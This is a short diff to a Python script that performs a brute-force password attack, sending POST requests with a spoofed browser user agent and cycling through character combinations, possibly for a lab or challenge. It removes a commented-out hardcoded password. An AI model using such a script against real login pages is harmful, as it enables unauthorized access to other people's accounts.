@@ -22,9 +22,10 @@ data = {
 }
 sess = requests.Session()
 sess.headers['User-Agent'] = 'Mozilla'
+correct_password = var.password
 
 
-def try_password(trial=''):
+def try_password(trial=[]):
     ' Send POST request attempt with password '
     try:
         data['password'] = ''.join(trial)
@@ -41,9 +42,7 @@ def try_password(trial=''):
 
 def main():
     ' Perform Brute force attack '
-    # correct_password = '.5_pFO*p6s8Kcj+U'
-    
-    start_text = 'abcdefghijklmnopqrstuvwxyz'  # text for first attempt
+    start_text = 'abcdefghij'  # text for first attempt
     length = len(start_text)  # how many char in password
     generator = itertools.combinations_with_replacement(start_text, length)
     for password in generator:
